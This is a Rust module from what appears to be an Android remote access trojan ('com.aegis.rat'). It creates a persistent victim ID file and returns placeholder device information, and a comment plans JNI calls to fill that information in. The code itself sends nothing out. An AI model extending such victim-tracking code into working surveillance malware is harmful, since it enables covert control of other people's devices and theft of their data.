use crate::comms::SystemInfo;
use std::fs;
use uuid::Uuid;

pub fn get_or_create_victim_id() -> String {
    // On Android, use the app's data directory
    let dir = std::env::var("ANDROID_DATA")
        .map(|d| format!("{}/data/com.aegis.rat/files", d))
        .unwrap_or_else(|_| "/tmp".to_string());
    let id_file = format!("{}/aegis_id.txt", dir);
    
    if fs::metadata(&id_file).is_ok() {
        fs::read_to_string(&id_file).unwrap_or_else(|_| Uuid::new_v4().to_string())
    } else {
        let id = Uuid::new_v4().to_string();
        let _ = fs::write(&id_file, &id);
        id
    }
}

pub fn get_system_info() -> SystemInfo {
    // Static values for now. We will add JNI calls later.
    SystemInfo {
        hostname: "AndroidDevice".to_string(),
        os: "Android".to_string(),
        android_version: "12+".to_string(),
        model: "Unknown".to_string(),
        battery: 100,
    }
}
